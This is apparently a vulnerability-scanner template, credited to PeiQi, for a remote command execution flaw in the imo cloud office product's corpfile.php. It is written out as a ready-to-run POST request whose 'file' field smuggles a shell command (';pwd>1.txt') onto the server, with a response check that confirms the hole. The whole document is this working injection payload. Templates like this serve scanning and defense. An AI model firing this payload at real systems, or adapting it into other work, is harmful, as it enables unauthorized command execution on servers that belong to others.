name: imo-corpfile-rce
rules:
  - method: POST
    path: "/corpfile.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "type=corpLogo&command=id&file=;pwd>1.txt"
    expression: |
      response.status == 200 && response.body.bcontains(b"command") && response.body.bcontains(b"file")
detail:
  author: PeiQi
  links:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  description: "imo 云办公室 corpfile.php 远程命令执行漏洞"
